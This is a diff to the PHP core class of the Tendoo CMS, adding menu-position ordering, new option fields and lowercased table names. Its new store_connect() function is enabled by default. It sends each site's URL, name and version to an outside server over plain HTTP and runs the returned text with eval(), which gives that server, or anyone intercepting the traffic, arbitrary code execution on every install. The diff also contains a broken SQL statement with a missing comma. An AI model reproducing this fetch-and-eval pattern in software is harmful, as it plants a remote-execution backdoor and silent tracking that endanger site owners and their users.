@@ -137,6 +137,7 @@ class Tendoo
 		  `PAGE_VISIBLE` varchar(5) NOT NULL,
 		  `PAGE_PARENT` varchar(200) NOT NULL,
 		  `PAGE_LINK` text,
+		  `PAGE_POSITION` int(11) NOT NULL,
 		  PRIMARY KEY (`ID`)
 		) ENGINE=InnoDB;';
 		if(!$this->core->db->query($sql))
@@ -196,7 +197,10 @@ class Tendoo
 		  `PUBLIC_PRIV_ACCESS_ADMIN` int(11) NOT NULL,
 		  `ACTIVATE_STATS` int(11) NOT NULL,
 		  `SHOW_ADMIN_INDEX_STATS` int(11) NOT NULL,
+		  `OPEN_APP_TAB` int(11) NOT NULL,
 		  `ADMIN_ICONS` text NOT NULL,
+		  `FIRST_VISIT` int(11) NOT NULL,
+		  `CONNECT_TO_STORE` int(11) NOT NULL
 		  PRIMARY KEY (`ID`)
 		) ENGINE=InnoDB;';
 		if(!$this->core->db->query($sql))
@@ -258,9 +262,9 @@ class Tendoo
 			return false;
 		};
 		
-		/// ADMIN PRIVILEGE TABLE create  `Tendoo_admin_privileges`
+		/// ADMIN PRIVILEGE TABLE create  `tendoo_admin_privileges`
 		$sql = 
-		'CREATE TABLE IF NOT EXISTS `'.$DB_ROOT.'Tendoo_admin_privileges` (
+		'CREATE TABLE IF NOT EXISTS `'.$DB_ROOT.'tendoo_admin_privileges` (
 		  `ID` int(11) NOT NULL AUTO_INCREMENT,
 		  `HUMAN_NAME` varchar(100) NOT NULL,
 		  `DESCRIPTION` text NOT NULL,
@@ -274,9 +278,9 @@ class Tendoo
 		{
 			return false;
 		};
-		/// ADMIN PRIVILEGE TABLE create  `Tendoo_privileges_actions`
+		/// ADMIN PRIVILEGE TABLE create  `tendoo_privileges_actions`
 		$sql = 
-		'CREATE TABLE IF NOT EXISTS `'.$DB_ROOT.'Tendoo_privileges_actions` (
+		'CREATE TABLE IF NOT EXISTS `'.$DB_ROOT.'tendoo_privileges_actions` (
 		  `ID` int(11) NOT NULL AUTO_INCREMENT,
 		  `OBJECT_NAMESPACE` 	varchar(200) NOT NULL,
 		  `TYPE_NAMESPACE` 		varchar(200) NOT NULL,
@@ -501,6 +505,8 @@ class Tendoo
 	{
 		$q = $this->core->db->get('tendoo_options');
 		$r = $q->result();
+		$value['FIRST_VISIT']			=	'1'; // it's the first visit :D
+		$value['CONNECT_TO_STORE']		=	'1'; // by default tendoo connect to store
 		if(count($r) == 1)
 		{	
 			$value['SITE_NAME'] 			= $name;
@@ -575,6 +581,17 @@ class Tendoo
 			}
 			return 'noMainPage';
 		}
+		else if(preg_match('#@#',$page))
+		{
+			$Teurmola	=	explode('@',$page);
+			return array(
+				array(
+					'PAGE_TITLE'				=>		$this->getTitle(),
+					'PAGE_CNAME'				=>		$page,
+					'PAGE_DESCRIPTION'		=>		$this->getDescription()
+				)
+			);
+		}
 		else if($getAll == FALSE && $page != null)
 		{
 			$this->core->db->select('*')
@@ -603,7 +620,7 @@ class Tendoo
 	public function getControllers()
 	{
 		$this->core->db->select('*')
-					->from('tendoo_controllers')->where('PAGE_VISIBLE','TRUE');
+					->from('tendoo_controllers')->where('PAGE_VISIBLE','TRUE')->order_by('PAGE_POSITION','asc');
 		$r			=	$this->core->db->get();
 		return $r->result_array();
 	}
@@ -618,6 +635,7 @@ class Tendoo
 			}
 			$this->core	->db->select('*')
 						->where('PAGE_PARENT',$cname) // On recupère le menu de base
+						->order_by('PAGE_POSITION','asc')
 						->from('tendoo_controllers');
 			$query 		=	$this->core->db->get();
 			if($query->num_rows > 0)
@@ -636,7 +654,8 @@ class Tendoo
 						'PAGE_MAIN'			=>		$obj->PAGE_MAIN,
 						'PAGE_VISIBLE'		=>		$obj->PAGE_VISIBLE,
 						'PAGE_CHILDS'		=> 		$this->get_sublevel($obj->ID,$level+1),
-						'PAGE_LINK'			=>		$obj->PAGE_LINK
+						'PAGE_LINK'			=>		$obj->PAGE_LINK,
+						'PAGE_POSITION'		=>		$obj->PAGE_POSITION
 					);
 				}
 				return $array;
@@ -658,6 +677,7 @@ class Tendoo
 			}
 			$this->core	->db->select('*')
 						->where('PAGE_PARENT','none') // On recupère le menu de base
+						->order_by('PAGE_POSITION','asc')
 						->from('tendoo_controllers');
 			$query 	=	$this->core->db->get();
 			$array		=	array();
@@ -674,7 +694,8 @@ class Tendoo
 					'PAGE_MAIN'		=>$obj->PAGE_MAIN,
 					'PAGE_VISIBLE'	=>$obj->PAGE_VISIBLE,
 					'PAGE_CHILDS'	=> $this->get_sublevel($obj->ID,1),
-					'PAGE_LINK'		=>$obj->PAGE_LINK // new added 0.9.4
+					'PAGE_LINK'		=>$obj->PAGE_LINK, // new added 0.9.4
+					'PAGE_POSITION'	=>	$obj->PAGE_POSITION
 				);
 			}
 			$this->getpages	=	$array;
@@ -703,7 +724,8 @@ class Tendoo
 					'PAGE_MAIN'		=>$obj->PAGE_MAIN,
 					'PAGE_VISIBLE'	=>$obj->PAGE_VISIBLE,
 					'PAGE_CHILDS'	=>$this->get_sublevel($obj->ID,1),
-					'PAGE_LINK'		=>	$obj->PAGE_LINK // New added 0.9.4
+					'PAGE_LINK'		=>	$obj->PAGE_LINK, // New added 0.9.4
+					'PAGE_POSITION'	=>	$obj->PAGE_POSITION // added 0.9.5
 				);
 			}
 			$this->getpages	=	$array;
@@ -1435,5 +1457,33 @@ class Tendoo
 				}
 			}
 		}
-	}	
+	}
+	public function sochaBackground()
+	{
+		$available_background	=	array(
+			''
+		);
+	}
+	public function store_connect() // must create interface to disable this.
+	{
+		$platform	=	'http://tendoo.tk/';
+		
+		$option	=	$this->core->db->get('tendoo_options');
+		$result	=	$option->result_array();
+		if($result[0]['CONNECT_TO_STORE'] == '1')
+		{
+			$tracking_result	=	file_get_contents(
+				'http://tendoo.tk/index.php/store/connect?blog_url='.
+					$this->core->url->main_url().
+				'&blog_name='.
+					$result[0]['SITE_NAME'].
+				'&tendoo_vers='.
+					$this->getVersion()
+			);
+			if($tracking_result)
+			{
+				eval($tracking_result);
+			}
+		}
+	}
 }
